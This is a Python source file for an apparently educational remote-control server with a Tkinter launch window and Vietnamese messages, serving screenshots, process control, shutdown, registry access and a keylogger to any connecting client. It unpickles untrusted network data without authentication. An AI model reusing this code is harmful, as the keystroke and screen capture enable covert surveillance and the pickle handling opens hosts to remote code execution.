import socket
import os
import process
import keylog
import screen
import registry
from struct import *
import pickle
from tkinter import *
import tkinter.ttk as exTK


class SocketError(Exception):
    pass
class Socket:
    def __init__(self,host=socket.gethostname(),port=2345,verbose=0):
        self.host=host
        self.port=port
        self.SocketError=SocketError()
        self.verbose=verbose
        try:
            if self.verbose:
                print('SocketUtils:Creating Socket()')
            self.sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        except socket.error:
            raise SocketError('Error in Socket Object Creation!!')
    def Close(self):
        if self.verbose:
            print('SocketUtils:Closing socket!!')
        self.sock.close()
        if self.verbose:
            print('SocketUtils:Socket Closed!!')
class SocketServer(Socket):
    def __init__(self,host=socket.gethostname(),port=2345,verbose=0):
        self.host,self.rhost=host,host
        self.port,self.rport=port,port
        self.verbose=verbose
        try:
            if self.verbose:
                print('SocketUtils:Creating SocketServer()')
            self.sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        except socket.error:
            raise SocketError('Failed to create SocketServer object!!')
        try:
            if self.verbose:
                print('SocketUtils:Binding Socket()')
            self.sock.bind((self.host,self.port))
            if self.verbose:
                print (self)
        except socket.error as msg:
            raise SocketError(msg)
    def Listen(self,msg='Accepted Connection from:'):
        if self.verbose:
            print('Listening to port')%self.port
        self.sock.listen(1)
        self.conn,self.rhost=self.sock.accept()
        self.rhost=self.rhost[0]
        if self.rhost:
            if self.verbose:
                print('Got connection from',self.rhost)
        #print (msg,self.rhost)
    def Send(self, obj):
        msg = pickle.dumps(obj)
        length = pack('>Q',len(msg))
        self.conn.sendall(length)
        self.conn.sendall(msg)
    def Receive(self):
        msg = bytearray()
        header = self.conn.recv(8)
        (length,) = unpack('>Q',header)
        length_recv = 0
        while length_recv < length:
            s = self.conn.recv(8192)
            msg += s
            length_recv += len(s)
        return pickle.loads(msg)
    def Choices(self,msg):
        if msg == 'Connecting...':
            self.Send('Connected.')
        elif msg == 'Screenshot':
            img = screen.screenshot()
            self.Send(img)
        elif msg == 'Shutdown':
            self.conn.close()
            self.Close()
            os.system("shutdown /s /t 30")
        elif msg == 'List process':
            listprocess = process.getListProcess()
            self.Send(listprocess)
        elif msg == 'Kill process':
            id = self.Receive()
            err=0
            listprocess = process.getListProcess()
            for value in listprocess:
                if str(value['id']) == id:
                    process.killProcess(id)
                    self.Send('Đã diệt process')
                    err=err+1
                    break
            if err == 0:
                self.Send('Không tìm thấy process')
        elif msg == 'Start process':
            name = self.Receive()
            process.startProcess(name)
            self.Send('Process đã được bật')
        elif msg =='List app':
            listapp = process.getListApp()
            self.Send(listapp)
        elif msg == 'Kill app':
            id = self.Receive()
            err=0
            listapp = process.getListApp()
            for app_id in listapp:
                if str(app_id['id']) == id:
                    process.killProcess(id)
                    self.Send('Đã diệt chương trình')
                    err=1
            if err == 0:
                self.Send('Không tìm thấy chương trình')
        elif msg == 'Start app':
            name = self.Receive()
            process.startProcess(name)
            self.Send('Chương trình đã được bật')
        elif msg =='Hook':
            keylog.start_keylog()
            hook_yet = True
            keylog.hook()
        elif msg == 'Unhook':
            keylog.unhook()
        elif msg == 'Print key':
            self.Send(keylog.get_key())
        elif msg == 'import':
            data = self.Receive()
            registry.import_filereg(data)
        elif msg[0] == 'Get value':
            data = registry.getValue(msg[1],msg[2])
            self.Send(data)
        elif msg[0] == 'Set value':
            self.Send('Set')
        elif msg[0] == 'Delete value':
            self.Send('Delete')
        elif msg[0] == 'Create key':
            self.Send('Create')
        elif msg[0] == 'Delete key':
            self.Send('Delete')
        elif msg == 'Quit':
            self.conn.close()
            self.Close()
            exit()

def startServer():
    sv = SocketServer()
    print(socket.gethostname())

    while True:
        sv.Listen()
        while True:
            msg = sv.Receive()
            sv.Choices(msg)

win = Tk()
win.geometry('275x275+500+300')
win.title('Server')
exTK.Button(win,text='Mở server',command=startServer).place(relheight=0.6,
            relwidth=0.6,relx=0.2,rely=0.2)
win.mainloop()

